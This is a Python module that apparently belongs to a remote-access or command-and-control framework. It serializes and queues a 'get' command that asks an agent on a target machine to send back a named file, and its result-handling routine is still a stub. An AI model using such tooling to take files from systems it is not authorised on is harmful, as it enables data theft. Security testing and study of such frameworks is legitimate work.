import struct
import message
from helper import str_to_c_str
from globals import ctx
from session import HEADER_LEN, INT_SIZE

MODULE_ID = 0x01

def entrypoint(self, args):
    """ Get a file from target
    'get remote_file.exe'
    """

    module_args = {"REMOTE_FILE": args, "JOB_ID": ctx.get_next_job()}
    msg = message.Message(_serialize(module_args))
    ctx.send_queue.put(msg)
    return False


def _serialize(data):
    serialized_data = bytearray()

    result_code = 0
    cmd_type = MODULE_ID
    job_id = data["JOB_ID"]
    remote_file = str_to_c_str(data["REMOTE_FILE"])
    remote_filename_len = len(remote_file)
    data_len = HEADER_LEN + remote_filename_len + INT_SIZE

    serialized_data.extend(struct.pack("I", data_len))
    serialized_data.extend(struct.pack("I", job_id))
    serialized_data.extend(struct.pack("I", cmd_type))
    serialized_data.extend(struct.pack("I", result_code))
    serialized_data.extend(struct.pack("I", remote_filename_len))
    serialized_data.extend(struct.pack(f"{remote_filename_len}s", remote_file))

    return serialized_data

def _deserialize(data):
    # TODO
    # Check result code
    # Process message
    # Log results
    # Idea
    # Add functionality to post command to wait for job-id results to come back
    pass